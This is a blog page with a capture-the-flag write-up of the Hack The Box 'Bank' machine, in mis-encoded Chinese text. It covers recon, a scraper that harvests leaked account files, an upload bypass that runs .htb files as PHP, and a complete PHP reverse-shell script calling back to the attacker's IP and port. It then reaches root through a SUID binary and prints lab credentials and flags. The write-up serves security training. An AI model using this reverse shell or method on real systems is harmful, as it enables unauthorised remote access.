<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Bank - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Banké¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Bank] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-28 01:51 EDT N">
<meta property="og:type" content="article">
<meta property="og:title" content="Bank - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Banké¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Bank] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-28 01:51 EDT N">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/9389a965-ea28-4096-a234-c29cd50f0674.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png">
<meta property="article:published_time" content="2022-03-30T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:40:27.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/9389a965-ea28-4096-a234-c29cd50f0674.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                è¯·æˆ‘å–å’–å•¡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Bank - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Bank - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-03-30T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-03-30
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Bank"><span class="post-toc-text">Hackthebox - Bank</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Bank"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Bank - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-03-30 19:38:36" datetime="2022-03-30T11:38:36.000Z"  itemprop="datePublished">2022-03-30</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Bank"><a href="#Hackthebox-Bank" class="headerlink" title="Hackthebox - Bank"></a>Hackthebox - Bank</h1><h1 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h1><img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/9389a965-ea28-4096-a234-c29cd50f0674.png" class>

<h1 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h1><img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png" class>

<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Bank]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT
Nmap scan report for 10.10.10.29
Host is up (0.53s latency).
Not shown: 63750 filtered ports, 1782 closed ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  tcpwrapped
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA
OS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8
OS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B
OS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1
OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%
OS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=
OS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   991.53 ms 10.10.16.1
2   233.51 ms 10.10.10.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.30 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png" class>

<p>ç›´æ¥è®¿é—® ip åœ°å€ï¼Œä¼šè¿›å…¥ apache çš„é»˜è®¤é¡µé¢ï¼ŒåŒæ—¶æˆ‘ä»¬çœ‹åˆ° 53 ç«¯å£æ‰“å¼€ç€ï¼Œå¾ˆå…¸å‹çš„ DNS æœåŠ¡å™¨ï¼Œæ·»åŠ ä¸€ä¸ªè§£æ</p>
<pre><code class="bash">echo 10.10.10.29 bank.htb
</code></pre>
<p>ç„¶åå»è®¿é—®ä¸€ä¸‹</p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png" class>

<p>è¿™å°±æœ‰é¡µé¢äº†ï¼Œå» fuzz ä¸€ä¸‹ç›®å½•</p>
<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -u &quot;http://bank.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
</code></pre>
<p>å‰ä¸‰ä¸ªéƒ½æ²¡ä¸œè¥¿ï¼Œå’±ä»¬å»çœ‹çœ‹ç¬¬å››ä¸ª <code>balance-transfer</code> </p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png" class>

<p>æœ‰å¾ˆå¤šçš„ <code>.acc</code> ç»“å°¾çš„æ–‡ä»¶ï¼Œå»çœ‹ä¸€ä¸ª</p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png" class>

<p>è¿™çœ‹èµ·æ¥åƒæ˜¯å­˜å‚¨çš„ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯éƒ½æ˜¯åŠ å¯†çš„ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ä¹Ÿæ— æ³•è§£å¯†å‡ºæ¥ï¼Œå¤šæ‰¾æ‰¾çœ‹</p>
<pre><code class="bash">import requests
import re

response = requests.get(&quot;http://bank.htb/balance-transfer/&quot;)
html = response.text
urls = re.findall(&#39;&lt;a href=&quot;(.*?acc)&quot;&gt;.*?acc&lt;/a&gt;&#39;, html)
x = 1
y = len(urls) - 1
for url in urls:
    url = &#39;http://bank.htb/balance-transfer/&#39; + url
    name = url.split(&#39;/&#39;)[-1]
    response = requests.get(url)
    with open(name, &quot;wb&quot;) as f:
        f.write(response.content)
        print(&#39;ã€%sã€‘ ä¸‹è½½å®Œæ¯• å½“å‰å®Œæˆä»»åŠ¡ï¼š%s æ¬¡ è¿˜å‰©ä»»åŠ¡ %s æ¬¡&#39; % (url, x, y))
        x += 1
        y -= 1
</code></pre>
<p>ç”±äºæ•°é‡æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥æˆ‘å†™äº†ä¸ªç®€å•çš„çˆ¬è™«æ¥è‡ªåŠ¨ä¸‹è½½æ–‡ä»¶</p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png" class>

<p>ä¸€å…± 999 ä¸ªç”¨æˆ·ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ²¡æœ‰åŠ å¯†çš„æ¼ç½‘ä¹‹é±¼</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]
â””â”€# grep -r &#39;bank.htb&#39; ./                                                        
./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb
</code></pre>
<p>çˆ¬è™«çˆ¬å®Œäº†ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ <code>bank.htb</code> é‚®ç®±çš„å†…å®¹ï¼Œè¿˜çœŸæœåˆ°äº†ä¸€ä¸ª</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]
â””â”€# cat 68576f20e9732f1b2edc4df5b8533230.acc                                                                     
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
</code></pre>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹ï¼ŒæˆåŠŸæ‹¿åˆ°ä¸€ä¸ªå¯ä»¥ç”¨çš„è´¦å·å¯†ç </p>
<p>å»ç™»å½•ä¸€ä¸‹åå°çœ‹çœ‹</p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png" class>

<p>æˆåŠŸè¿›å…¥åå°</p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png" class>

<p>ä¸»é¡µä¸Šæ²¡ä»€ä¹ˆåŠŸèƒ½ç‚¹ï¼Œå°±ä¸€ä¸ªæ”¯æŒï¼Œç„¶ååœ¨æ”¯æŒé‡Œé¢æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ç›´æ¥ä¸Šä¼  phpwebshellï¼Œä¸Šä¼ å¤±è´¥ã€‚æˆ‘ä»¬å»çœ‹çœ‹ç½‘é¡µæºç </p>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png" class>

<p>åœ¨ 95 è¡Œå‘ç°è¿™ä¹ˆä¸€å¥</p>
<p>å°†ä¼šæŠŠ <code>.htb</code> æ ¼å¼çš„æ–‡ä»¶ä»¥ <code>.php</code> æ ¼å¼æ¥è¿è¡Œï¼ŒOKï¼Œæ€è·¯æœ‰äº†</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><pre><code class="bash">&lt;?php
set_time_limit (0);
$VERSION = &quot;1.0&quot;;
$ip = &#39;10.10.16.4&#39;;  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists(&#39;pcntl_fork&#39;)) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit(&quot;ERROR: Can&#39;t fork&quot;);
        exit(1);
    }

    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit(&quot;Error: Can&#39;t setsid()&quot;);
        exit(1);
    }

    $daemon = 1;
} else {
    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
}

// Change to a safe directory
chdir(&quot;/&quot;);

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit(&quot;$errstr ($errno)&quot;);
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit(&quot;ERROR: Shell connection terminated&quot;);
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit(&quot;ERROR: Shell process terminated&quot;);
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process&#39;s STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit(&quot;SOCK READ&quot;);
        $input = fread($sock, $chunk_size);
        if ($debug) printit(&quot;SOCK: $input&quot;);
        fwrite($pipes[0], $input);
    }

    // If we can read from the process&#39;s STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit(&quot;STDOUT READ&quot;);
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit(&quot;STDOUT: $input&quot;);
        fwrite($sock, $input);
    }

    // If we can read from the process&#39;s STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit(&quot;STDERR READ&quot;);
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit(&quot;STDERR: $input&quot;);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we&#39;ve daemonised ourself
// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print &quot;$string\n&quot;;
    }
}

?&gt;
</code></pre>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png" class>

<p>å°†æˆ‘ä»¬çš„ phpshell çš„åç¼€æ›´æ”¹ä¸º <code>.htb</code> ç„¶åå»ä¸Šä¼ </p>
<p>ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<img src="/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png" class>

<p>ä¼ ä¸Šå»ä»¥åï¼Œç‚¹ä¸€ä¸‹é™„ä»¶</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]
â””â”€# nc -nvlp 4444                                      
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 05:08:13 up 20:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/$ whoami&amp;&amp;id
whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell</p>
<pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
Ctrl+Z è¿”å›
stty raw -echo; fg
export TERM=xterm
stty rows 51 cols 237
</code></pre>
<p>ä¿®å¤ä¸€ä¸‹ shell</p>
<h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><pre><code class="bash">find / -user root -perm -4000 -print 2&gt;/dev/null
</code></pre>
<p>æœç´¢ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ç”¨æ¥æå‡æƒé™çš„ SUID æ–‡ä»¶</p>
<pre><code class="bash">www-data@bank:/$ find / -user root -perm -4000 -print 2&gt;/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
</code></pre>
<p>ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸€çœ‹å°±ä¸ç®€å•ï¼Œå»è¿è¡Œä¸€ä¸‹</p>
<pre><code class="bash">www-data@bank:/$ /var/htb/bin/emergency
# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
# whoami
root
</code></pre>
<p>ç›´æ¥å°± root äº†ï¼Ÿæˆ‘ä¸æ˜¯å¾ˆç†è§£åŸç†</p>
<pre><code class="bash"># cat /home/chris/user.txt
20575ef51ddd60d74b616251bc305319
</code></pre>
<p>æ‹¿åˆ°äº† user æƒé™çš„ flag æ–‡ä»¶</p>
<pre><code class="bash"># cat /root/root.txt
9e6410fc2696f73f668c5dde1f5d0d99
</code></pre>
<p>æ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/&title=ã€ŠBank - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
